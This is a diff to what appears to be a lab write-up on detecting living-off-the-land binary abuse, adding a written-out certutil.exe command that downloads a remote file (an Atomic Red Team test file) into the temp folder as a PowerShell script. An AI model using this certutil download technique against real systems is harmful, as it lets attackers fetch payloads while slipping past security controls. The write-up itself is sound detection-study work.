@@ -100,9 +100,10 @@ The command downloaded a remote payload from GitHub using:
 
 This demonstrates how attackers abuse **signed Microsoft binaries** to bypass traditional security controls.
 
-### Screenshot – Certutil Command Execution
+#### Certutil Command Execution
+        certutil.exe -urlcache -split -f  https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomic/T1105/src\test.txt $env:TEMP\malicious_script.ps1
 
-INSERT SCREENSHOT HERE
+![Alt Text](https://github.com/Baidgr8/Advanced-LOLBAS-Detection-Analysis/blob/961643084252b94de2596e6741d5e48a340063e2/screenshot/attacker%20execution%20ingress%20tool%20transfer%20(T1135).PNG)
 
 *(PowerShell terminal showing the certutil.exe command execution)*
 
